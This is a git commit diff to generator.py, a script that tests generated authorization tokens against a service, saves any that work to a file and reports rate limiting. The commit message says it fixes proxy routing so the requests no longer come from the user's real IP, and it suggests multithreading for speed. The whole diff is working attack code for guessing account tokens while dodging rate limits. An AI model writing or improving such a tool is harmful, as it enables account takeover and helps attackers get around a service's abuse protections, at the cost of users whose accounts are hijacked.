5f00bfa445400f423ce48d44e14725fda9bf252b
Zayd Alzein <zaydalzein@gmail.com>
2021-04-13 12:10:19 -0500

    Actually uses proxies lmfao
    this script doesn't effectively use proxies, so it results in sending the request with ur actual IP, which is why ur getting rate limited. I recommend u multithread this too so that its faster, as proxies take a long time. I fixed the proxy issue.

--- generator.py
+++ generator.py
@@ -34,14 +34,18 @@ while(int(count) < int(N)):
             "Content-Type": "application/json",
             "authorization": token
         }
-        r = requests.get(url, headers=header, proxies={"http": proxy})
-        print(token)
-        if r.status_code == 200:
-            print(u"\u001b[32;1m[+] Token Works!\u001b[0m")
-            f = open(current_path+"/"+"workingtokens.txt", "a")
-            f.write(token+"\n")
-        elif "rate limited." in r.text:
-            print("[-] You are being rate limited.")
-        else:
-            print(u"\u001b[31m[-] Invalid Token.\u001b[0m")
+        try:
+            r = requests.get(url, headers=header, proxies={'https':"http://"+proxy})
+            print(r.text)
+            print(token)
+            if r.status_code == 200:
+                print(u"\u001b[32;1m[+] Token Works!\u001b[0m")
+                f = open(current_path+"/"+"workingtokens.txt", "a")
+                f.write(token+"\n")
+            elif "rate limited." in r.text:
+                print("[-] You are being rate limited.")
+            else:
+                print(u"\u001b[31m[-] Invalid Token.\u001b[0m")
+        except requests.exceptions.ProxyError:
+            print("BAD PROXY")
     tokens.remove(token)
